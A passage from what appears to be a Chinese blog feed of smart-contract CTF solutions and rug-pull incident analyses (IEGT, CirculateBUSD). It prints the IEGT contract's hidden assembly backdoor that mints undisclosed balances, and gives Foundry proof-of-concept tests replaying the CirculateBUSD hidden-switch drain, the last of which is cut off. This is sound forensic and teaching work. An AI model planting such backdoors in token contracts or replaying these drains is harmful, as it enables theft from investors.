</span><br><span class="line">        WETH9(token1).balanceOf(address(this)), </span><br><span class="line">        0, </span><br><span class="line">        0, </span><br><span class="line">        msg.sender, </span><br><span class="line">        block.timestamp</span><br><span class="line">    );</span><br><span class="line">    require(amountOut &gt;= minAmountOut);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Logs:</span><br><span class="line">  [before] WETH 10</span><br><span class="line">  [before] COMP 1000</span><br><span class="line">  [after] WETH 0</span><br><span class="line">  [after] COMP 631</span><br></pre></td></tr></table></figure><p>本例子中无论weth是token0还是token1，结果都是Logs那样。原因如下：1000个COMP可以换的WETH远多于10个，因此不会进入到if分支（此分支是用COMP换WETH），而是进入else分支，else分支则是用WETH换COMP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);</span><br><span class="line">      if (amountBOptimal &lt;= amountBDesired) &#123;</span><br><span class="line">          require(amountBOptimal &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;);</span><br><span class="line">          (amountA, amountB) = (amountADesired, amountBOptimal);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">          uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);</span><br><span class="line">          assert(amountAOptimal &lt;= amountADesired);</span><br><span class="line">          require(amountAOptimal &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;);</span><br><span class="line">          (amountA, amountB) = (amountAOptimal, amountBDesired);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>综上所述，token0和token1的位置不是非要token0是WETH，例子关键是让程序流进入到WETH换COMP的分支即可。回到题目，则是找到一个币对，然后让程序执行流进入到WETH换另外一个token即可，另外一个token需要足够多</p>]]></content>
      
      
      <categories>
          
          <category> 14.Paradigm CTF 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.random</title>
      <link href="/2023/09/18/14.Paradigm%20CTF%202022/01.random/"/>
      <url>/2023/09/18/14.Paradigm%20CTF%202022/01.random/</url>
      
        <content type="html"><![CDATA[<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/01.random/random.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract randomTest is Test &#123;</span><br><span class="line"></span><br><span class="line">    Random public random;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        random = new Random();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_Sloved() public &#123;</span><br><span class="line">        random.solve(4);</span><br><span class="line">        assertEq(random.solved(), true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 14.Paradigm CTF 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.RugPull@IEGT</title>
      <link href="/2023/09/18/13.RugPull/03.RugPull@IEGT/"/>
      <url>/2023/09/18/13.RugPull/03.RugPull@IEGT/</url>
      
        <content type="html"><![CDATA[<h1 id="RugPull-IEGT"><a href="#RugPull-IEGT" class="headerlink" title="RugPull@IEGT"></a>RugPull@IEGT</h1><h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><ul><li>关键词：内联汇编，构造器增发，storage位置计算</li><li>时间：2023.07.22</li><li>损失：1,143,787 BSC-USD  [$1,143,296]</li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>IEGT持有者情况：<a href="https://bscscan.com/token/0x8D07f605926837Ea0F9E1e24DbA0Fb348cb3E97D#balances">link</a></li><li>销币合约: <a href="https://bscscan.com/address/0x000000000000000000000000000000000000dEaD#tokentxns">0x000000000000000000000000000000000000dEaD</a></li><li>增发地址：<a href="https://bscscan.com/address/0x00002b9b0748d575cb21de3cae868ed19a7b5b56">0x00002b9b0748d575CB21De3caE868Ed19a7B5B56</a></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p>将IEGT换成UBS-USD卷款跑路：</p><ul><li><a href="https://bscscan.com/tx/0xc6f9900593c259bc09819417c39b184b2a66684b5b1ba19630673730c4c4dc49">0xc6f9900593c259bc09819417c39b184b2a66684b5b1ba19630673730c4c4dc49</a></li><li><a href="https://bscscan.com/tx/0x9cea0bd314181f42a359c26b68f8790add4daf83e2bfd2d349268538e4e1e2ca">0x9cea0bd314181f42a359c26b68f8790add4daf83e2bfd2d349268538e4e1e2ca</a></li></ul><h2 id="RP合约简析"><a href="#RP合约简析" class="headerlink" title="RP合约简析"></a>RP合约简析</h2><p>从合约有中文注释来看，大概率是我们国人开的韭菜盘。单纯是一个ERC20代币合约，然后添加了各种旁支功能。整体的架构就是一大堆辅助的库和interface，核心只有ERC20代币合约。没有任何实际作用的项目，单纯是炒币用，这种盘很大可能就是用来割韭菜的</p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>首先看到前三的代币拥有量跟总发行量的<a href="https://bscscan.com/token/0x8D07f605926837Ea0F9E1e24DbA0Fb348cb3E97D#balances">对比</a>，就感觉有问题，虽然1和2不是个人地址，但理论上他们也不应该有这么多，给这么多他们干啥用呢？第三个地址拥有这么大份额的代币，而且是一个陌生的地址，很有可能可以被控制。</p><p><img src="/2023/09/18/13.RugPull/03.RugPull@IEGT/image-20230827131230235.png" alt="image-20230827131230235"></p><p>这个项目被<a href="https://bscscan.com/token/0x8D07f605926837Ea0F9E1e24DbA0Fb348cb3E97D#tokenTrade">卷款跑路</a>，因此我们来看一下交易。很明显了，有两笔使用<code>1,000,000,000</code>的swap交易，换出了<code>1,143,775.72912132+12.6276455108497</code>个BSC-USD（上面的那笔是为了把剩余的12个代币都拿走，一点不剩）。</p><p><img src="/2023/09/18/13.RugPull/03.RugPull@IEGT/image-20230827131435574.png" alt="image-20230827131435574"></p><p>查看交易详情，我们发现都是<code>0x00002b9b0748d575CB21De3caE868Ed19a7B5B56</code>干的，他拥有极多的IEGT，但是totalSupply并没有记录。在这个地址找到了2个巨鲸的转账记录，这下我们知道了，这两个巨鲸的资金来源了。同时也进一步说明，<code>0x00002b9b0748d575CB21De3caE868Ed19a7B5B56</code>的资金没有被totalSupply记录，随时准备RugPull。</p><p><img src="/2023/09/18/13.RugPull/03.RugPull@IEGT/image-20230827132254582.png" alt="image-20230827132254582"></p><p>按照ERC20标准，每次和代币有关的交易无论mint还是转账，都需要触发event并记录在案，但是totalSupply并没有记录。因此，我们分析到底是从哪里来的资金。</p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>既然没有记录，那么就有两个可能：（1）直接修改storage存储数据，（2）在构造器中直接对变量进行操作。</p><p>分析所有方法过后，发现没有任何方法可以修改storage数据，因此我们查看构造器。它的主合约只有一个构造器，方法全部继承自父类，因此构造器会写的复杂，告诉别人我的构造器只是用来初始化参数而已。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">constructor() ERC20(&quot;IEGT&quot;,&quot;IEGT&quot;) &#123;</span><br><span class="line">        super.__SwapPool_init(_router, _usdt);</span><br><span class="line">        if (_isLimit) super.__Limit_init( _totalSupply / 250,_totalSupply / 250,  _totalSupply / 250 );</span><br><span class="line">        super.setSurprise( 5000, 3 );</span><br><span class="line">        super.__Token_init(_totalSupply, _marketing, _receive, _usdt);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>主要的初始化逻辑是四个，我们进行追溯。发现在池子池子初始化的方法中，找到这个东西：<code>super.__SwapPool_init(_router, _usdt);    ====&gt;    _pathSet(pairB);</code>：在初始化币对路径的时候，多了一个内联汇编，正常来说根本不需要。</p><p><img src="/2023/09/18/13.RugPull/03.RugPull@IEGT/image-20230827141810106.png" alt="image-20230827141810106"></p><p>整理一下，得到如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function _pathSet(address w) private &#123;</span><br><span class="line">    TokenB = IERC20(w); </span><br><span class="line">    address[] memory path = new address[](2); </span><br><span class="line">    path[0] = w; </span><br><span class="line">    path[1] = address(this); </span><br><span class="line">    _buyPath = path; </span><br><span class="line">    address[] memory path2 = new address[](2);</span><br><span class="line">    path2[0] = address(this); </span><br><span class="line">    path2[1] = w;</span><br><span class="line">    _sellPath = path2;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        let y := add(add(mul(379858174470926,exp(10,28)),mul(61835533555714,exp(10,14))),74433453022038) </span><br><span class="line">        mstore(0, y)</span><br><span class="line">        mstore(32, 0x0) </span><br><span class="line">        sstore(keccak256(0, 64), exp(timestamp(), 6)) </span><br><span class="line">        mstore(0, y) </span><br><span class="line">        mstore(32, 0xa) </span><br><span class="line">        sstore(keccak256(0,64), 1) </span><br><span class="line">        w := add(w, 16)</span><br><span class="line">    &#125; </span><br><span class="line">    TokenB.transfer(w, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进一步分析内联汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">          // y = 3798581744709266183553355571474433453022038 = 0x2b9b0748d575cb21de3cae868ed19a7b5b56</span><br><span class="line">          let y := add(add(mul(379858174470926,exp(10,28)),mul(61835533555714,exp(10,14))),74433453022038) </span><br><span class="line"></span><br><span class="line">          // memory:</span><br><span class="line">              // 00000000000000000000000000002b9b0748d575cb21de3cae868ed19a7b5b56 0x00</span><br><span class="line">              // 0000000000000000000000000000000000000000000000000000000000000000 0x20</span><br><span class="line">          mstore(0, y)</span><br><span class="line">          mstore(32, 0x0) </span><br><span class="line"></span><br><span class="line">          // 对0~64字节的内存位置进行keccak256,得到一个值x</span><br><span class="line">          // exp(timestamp(), 6)得到一个一个很大的随机值y</span><br><span class="line">          // 然后在storage位置x写入一个很大的值y</span><br><span class="line">          // 这个slot_[keccak256(0, 64)]位置算出来的是balanceOf(hacker)的存储位置，给了他金额y</span><br><span class="line">          sstore(keccak256(0, 64), exp(timestamp(), 6)) </span><br><span class="line"></span><br><span class="line">          // 后面的代码没啥用</span><br><span class="line">          </span><br><span class="line">          // memory:</span><br><span class="line">              //                                                              [y] 0x00</span><br><span class="line">              // 000000000000000000000000000000000000000000000000000000000000000a 0x20</span><br><span class="line">          mstore(0, y) </span><br><span class="line">          mstore(32, 0xa) </span><br><span class="line"></span><br><span class="line">          // 在slot_[keccak256(0,64)]写入值1</span><br><span class="line">          sstore(keccak256(0,64), 1) </span><br><span class="line"></span><br><span class="line">          // w的值增加16</span><br><span class="line">          w := add(w, 16)</span><br><span class="line">      &#125; </span><br></pre></td></tr></table></figure><p>分析合约继承结构可以知道，记录balance的变量位于slot_0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract ERC20 is Context, IERC20, IERC20Metadata &#123;</span><br><span class="line">    mapping(address =&gt; uint256) internal _balances;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) internal _allowances;</span><br></pre></td></tr></table></figure><p>这下我们明白了黑客的主要逻辑：</p><ol><li>把代码写成一坨，让用户看不清，混淆；</li><li>在构造器中做手脚，找一个隐蔽的位置<code>_pathSet(pairB)</code>中嵌入一段代码；</li><li>此代码，通过巧妙的方法计算出黑客的地址，然后用sstore写入balance的记录位置，这样，没有任何方法被调用（无法追溯），没有event释放，没有更新totalSupply；</li><li>另外：黑客将balance变量放在在slot_0，这是为了他自己计算位置方便。</li></ol><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC/tree/master/test">GitHub</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./contract.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker is Test &#123;</span><br><span class="line"></span><br><span class="line">    TokenIEGT public token;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 29_919_951);</span><br><span class="line">        token = new TokenIEGT();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_deploy() public&#123;</span><br><span class="line">        uint256 attackerInitBalance = token.balanceOf(address(0x00002b9b0748d575CB21De3caE868Ed19a7B5B56));</span><br><span class="line">        assertEq(attackerInitBalance, block.timestamp ** 6);</span><br><span class="line">        assertEq(token.totalSupply(), 5000000000000000000000000);</span><br><span class="line">        console.log(&quot;token.totalSupply():&quot;, token.totalSupply());</span><br><span class="line">        console.log(&quot;attackerInitBalance:&quot;, attackerInitBalance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Logs:</span><br><span class="line">  token.totalSupply(): 5000000000000000000000000</span><br><span class="line">  attackerInitBalance: 23234513382320230064402743165556372473988720904454891584</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ul><li>代码不整齐的，像这种一坨的，说明项目方心思不对，不可能有人这么编码的，肯定是编码之后进行打乱操作</li><li>看一个项目是否是rugPull，建议看holders，看看有没有巨鲸。如果受害者在操作之前能够看一下holders的情况，然后看看这些巨鲸的资金来源是哪，没准就能发现问题</li></ul>]]></content>
      
      
      <categories>
          
          <category> 13.RugPull </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.RugPull@CirculateBUSD</title>
      <link href="/2023/09/18/13.RugPull/02.RugPull@CirculateBUSD/"/>
      <url>/2023/09/18/13.RugPull/02.RugPull@CirculateBUSD/</url>
      
        <content type="html"><![CDATA[<h1 id="RugPull-CirculateBUSD"><a href="#RugPull-CirculateBUSD" class="headerlink" title="RugPull@CirculateBUSD"></a>RugPull@CirculateBUSD</h1><h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><ul><li>关键词：未开源swapHelper，隐藏开关</li><li>时间：2023.01.12</li><li>损失：$2.27 Million</li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>攻击事件hash：<a href="https://bscscan.com/tx/0x3475278b4264d4263309020060a1af28d7be02963feaf1a1e97e9830c68834b3">0x3475278b4264d4263309020060a1af28d7be02963feaf1a1e97e9830c68834b3</a></li><li>RugPull合约[CirculateBUSD]地址：<a href="https://bscscan.com/address/0x9639d76092b2ae074a7e2d13ac030b4b6a0313ff">0x9639D76092B2ae074A7E2D13Ac030b4b6A0313ff</a></li><li>swapToToken(未开源)：<a href="https://bscscan.com/address/0x112f8834cd3db8d2dded90be6ba924a88f56eb4b#code">0x112F8834cD3dB8D2DdEd90BE6bA924a88F56Eb4b</a></li><li>攻击者（受益者）地址：<a href="https://bscscan.com/address/0x5695Ef5f2E997B2e142B38837132a6c3Ddc463b7">0x5695Ef5f2E997B2e142B38837132a6c3Ddc463b7</a></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><div class="table-container"><table><thead><tr><th>地址</th><th>Token</th><th>金额</th></tr></thead><tbody><tr><td>Circulate Money Rug Pull[ Sender攻击者 ]</td><td>BUSD</td><td>+2,000,000</td></tr><tr><td>CirculateBUSD[ Receiver土狗合约 ]</td><td>BUSD</td><td>-2,000,000</td></tr></tbody></table></div><h2 id="RP合约简析"><a href="#RP合约简析" class="headerlink" title="RP合约简析"></a>RP合约简析</h2><p>只有一个CirculateBUSD合约，其他都是interface、library和标准库。方法包括：质押，存款，取款，清算，swap，开盘信息，自动交易。那么用户来玩这个合约的主要目的就是质押生息，或者借款，或者swap</p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p><img src="/2023/09/18/13.RugPull/02.RugPull@CirculateBUSD/image-20230825180735565.png" alt="image-20230825180735565"></p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>正常情况下，用户调用<code>startTrading()</code>是一个交易方法，用于swap。攻击过程1~4步每次调用都会执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  function startTrading(address _trader, uint256 _borrowAmount, address _swappedToken) public &#123;</span><br><span class="line">      // 静态调用一系列信息，1~4步骤</span><br><span class="line">.....</span><br><span class="line">      // 授权给未开源的ISwapHelper(SwapHelper)</span><br><span class="line">      IERC20(BUSDContract).safeApprove(SwapHelper, _borrowAmount);</span><br><span class="line">      // 开源的ISwapHelper(SwapHelper)进行swap</span><br><span class="line">      uint256 swapOutAmount = ISwapHelper(SwapHelper).swaptoToken( BUSDContract,_swappedToken, _borrowAmount);</span><br><span class="line">      ....</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于ISwapHelper(SwapHelper)没有开源，但是具体的攻击步骤是写在这里面的，因此我们将它<a href="https://library.dedaub.com/decompile?md5=5001f609a2a0a296bd05c5fb0d30d168">反编译</a>。这个<code>transferFrom()</code>是正常的，并没有恶意。</p><p><img src="/2023/09/18/13.RugPull/02.RugPull@CirculateBUSD/image-20230825181238735.png" alt="image-20230825181238735"></p><p>然后实际的转账是<code>trasnfer()</code>，然后我们就找到了这里：从图中可以知道，攻击者输入的_borrowAmount一定是等于<code>slot _7</code>的值才会进入攻击流</p><p><img src="/2023/09/18/13.RugPull/02.RugPull@CirculateBUSD/image-20230825181349785.png" alt="image-20230825181349785"></p><p>只有owner可以修改slot_6,7,8：owner调整slot值来让自己获利，进一步验证了项目方随时可以跑路</p><ul><li>slot_6：受益者地址</li><li>slot_7：开关值</li></ul><p><img src="/2023/09/18/13.RugPull/02.RugPull@CirculateBUSD/image-20230825181509389.png" alt="image-20230825181509389"></p><p>我们来看一下，最终的这几个slot：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># pancakerouter</span><br><span class="line">[SlotIndex] 5</span><br><span class="line">[Value]  [Hex][0x00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e] &lt;=&gt; [Dec][96635033217071433185869069577301221175488545358]</span><br><span class="line"></span><br><span class="line"># 受益者(黑客)地址 </span><br><span class="line">[SlotIndex] 6</span><br><span class="line">[Value]  [Hex][0x0000000000000000000000005695ef5f2e997b2e142b38837132a6c3ddc463b7] &lt;=&gt; [Dec][494316869550535217732822402122055319650864227255]</span><br><span class="line"></span><br><span class="line"># 开关值（并不是攻击的时候的开关值，黑客攻击之后又调用修改了一次）</span><br><span class="line">[SlotIndex] 7</span><br><span class="line">[Value]  [Hex][0x000000000000000000000000000000000000000000000036ea32f4e55eb40000] &lt;=&gt; [Dec][1013000000000000000000]</span><br></pre></td></tr></table></figure><p>那么，黑客肯定调用过这个方法，我们来找一下，可以发现，总共调用了三次，并且调用完之后就没其他交易了，说明攻击完成了，大家都知道项目方捐款跑路了，然后就没交易了。</p><p><img src="/2023/09/18/13.RugPull/02.RugPull@CirculateBUSD/image-20230825182236343.png" alt="image-20230825182236343"></p><p>我们按顺序分析这三个交易的calldata：可以看到，攻击者调用三次，只是为了修改slot_7，而slot_6(pancakerouter)和slot_8并没有修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 第一次</span><br><span class="line">0x4b2d25ef</span><br><span class="line">0000000000000000000000005695ef5f2e997b2e142b38837132a6c3ddc463b7</span><br><span class="line">000000000000000000000000000000000000000000002a5a058fc295ed000000</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000002710</span><br><span class="line"></span><br><span class="line"># 第二次</span><br><span class="line">0x4b2d25ef</span><br><span class="line">0000000000000000000000005695ef5f2e997b2e142b38837132a6c3ddc463b7</span><br><span class="line">00000000000000000000000000000000000000000001a784379d99db42000000 // (*)</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000002710</span><br><span class="line"></span><br><span class="line"># 第三次</span><br><span class="line">0x4b2d25ef</span><br><span class="line">0000000000000000000000005695ef5f2e997b2e142b38837132a6c3ddc463b7</span><br><span class="line">000000000000000000000000000000000000000000000036ea32f4e55eb40000 // 发现和目前的slot_7的值一致</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000002710</span><br></pre></td></tr></table></figure><p>对比攻击时候的calldata可以发现，它的<code>startTrading()</code>的参数<code>_swappedToken</code>和slot_7的值一样，也就是匹配到了攻击开关值，进入攻击的条件流。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x63437561</span><br><span class="line">000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56 000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c 00000000000000000000000000000000000000000001a784379d99db42000000 // 发现和(*)的一样，此次交易会进入到transfers</span><br></pre></td></tr></table></figure><p>说明发起攻击之前，黑客调用了<code>0x4b2d25ef()</code>作为攻击之前准备</p><p><img src="/2023/09/18/13.RugPull/02.RugPull@CirculateBUSD/image-20230825182839420.png" alt="image-20230825182839420"></p><p>其他：个人感觉这个设置受益者开关和受益者地址的方法多余，直接硬编码都没关系或者在构造器期间赋值就好。攻击者相信用户输入的值不回匹配到开关值，就算匹配到了，获利的也是黑客，属于是帮黑客攻击了。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC">github</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker is Test &#123;</span><br><span class="line"></span><br><span class="line">    // 土狗合约</span><br><span class="line">    ICirculateBUSD public CirculateBUSD = ICirculateBUSD(address(0x9639D76092B2ae074A7E2D13Ac030b4b6A0313ff));</span><br><span class="line">    // 攻击者</span><br><span class="line">    // BUSDC</span><br><span class="line">    IBUSDC busdc = IBUSDC(address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56));</span><br><span class="line">    address public attacker = 0x5695Ef5f2E997B2e142B38837132a6c3Ddc463b7;</span><br><span class="line">    // 为开源的swap合约，开关隐藏在这</span><br><span class="line">    address public swapToToken = 0x112F8834cD3dB8D2DdEd90BE6bA924a88F56Eb4b;</span><br><span class="line"></span><br><span class="line">     function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 24_715_926);</span><br><span class="line"></span><br><span class="line">        vm.label(address(CirculateBUSD), &quot;CirculateBUSD&quot;);</span><br><span class="line">        vm.label(address(attacker), &quot;attacker&quot;);</span><br><span class="line">        vm.label(address(swapToToken), &quot;swapToToken&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_Exploit() public &#123;</span><br><span class="line">        vm.startBroadcast(address(attacker));</span><br><span class="line"></span><br><span class="line">        uint256 beforeAttack = busdc.balanceOf(address(attacker));</span><br><span class="line">        console.log(&quot;before attacker balance:&quot;, beforeAttack);</span><br><span class="line">        </span><br><span class="line">        // 攻击之前得设置一下slot_7</span><br><span class="line">        bytes memory data = abi.encodePacked(</span><br><span class="line">            bytes4(0x4b2d25ef),</span><br><span class="line">            bytes32(0x0000000000000000000000005695ef5f2e997b2e142b38837132a6c3ddc463b7),</span><br><span class="line">            bytes32(0x00000000000000000000000000000000000000000001a784379d99db42000000),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000002710)</span><br><span class="line">        );</span><br><span class="line">        uint size = data.length;</span><br><span class="line">        address x = address(swapToToken);</span><br><span class="line">        assembly&#123;</span><br><span class="line">            switch call(gas(), x, 0, add(data,0x20), size, 0, 0)</span><br><span class="line">            case 0 &#123;</span><br><span class="line">                   returndatacopy(0x00,0x00,returndatasize())</span><br><span class="line">                   revert(0, returndatasize()) </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 发起攻击</span><br><span class="line">        